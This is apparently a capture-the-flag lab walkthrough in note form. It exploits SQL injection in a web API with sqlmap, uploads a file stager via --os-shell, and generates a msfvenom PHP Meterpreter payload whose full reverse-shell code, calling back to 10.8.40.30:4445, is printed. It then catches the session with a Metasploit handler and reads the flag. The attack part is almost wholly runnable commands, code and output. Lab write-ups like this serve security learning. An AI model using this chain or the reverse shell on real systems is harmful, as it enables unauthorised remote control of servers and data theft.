
## SQL Injection
https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/

- Copy the following response as save it as **r.txt**.
```
GET /api.php?documentid=1&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD HTTP/1.1
Host: <MACHINE IP>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=uafomq8a14mf4lkb7pktbrgt69
Connection: close
Upgrade-Insecure-Requests: 1
```

- Make sure you change the host IP address before saving it.

### Get Databases
- Launch the sqlmap with the following command.
```
sqlmap -r r.txt --dbs --batch
```

> available databases [5]:
> [*] information_schema
> [*] myfirstwebsite
> [*] mysql
> [*] performance_schema
> [*] sys


### Create a SQL upload page

```
$ sqlmap -r r.txt -D myfirstwebsite --os-shell
```

Select PHP (option 4), ‘no’ option and then brute-force (option 4).

Which web application language does the web server support?
> [1] ASP
> [2] ASPX
> [3] JSP
> [4] PHP (default)
> <span style="background:#ff4d4f">4</span>
do you want sqlmap to further try to provoke the full path disclosure? [Y/n] <span style="background:#ff4d4f">n</span>
[14:53:33] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs, /usr/local/var/www') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> <span style="background:#ff4d4f">4</span>

Use any additional custom directories [Enter for None]:
Enter **/var/www/html** as custom directory.

> [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://10.10.232.223:80/tmpuuuxb.php

### Visit the site
![[uploader.png]]



## Generate a reverse shell using msfvenom

```
$ msfvenom -p php/meterpreter/reverse_tcp lhost=<tunnel IP> lport=4445 -f raw
```

[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1111 bytes

---

```
<?php /**/ error_reporting(0); $ip = '10.8.40.30'; $port = 4445; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();`</font>
```

---

- Copy the above code and save it as shell.php. 

- After that, upload the shell.php using the sqlmap uploader.
	![[shell.png]]


### Metasploit
Open up msfconsole and set the following options:

```
msf> use multi/handler
msf exploit(handler) > set lport 4445
msf exploit(handler) > set lhost tun0
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
msf exploit(handler) > exploit
```

### Trigger the reverse shell
Visit  http://Machine_IP/shell.php


## Meterpreter

[*] Started reverse TCP handler on 10.8.40.30:4445                                  
[*] Sending stage (39927 bytes) to 10.10.136.85                                     
[*] Meterpreter session 1 opened (10.8.40.30:4445 -> 10.10.136.85:59092) at 2024-04-10 13:31:43 -0400                                                                   

meterpreter > shell

`cd ..`
`ls`
`cat flat.txt`

The flag is {FLAG:Webapp:48a5f4bfef44c8e9b34b926051ad35a6}

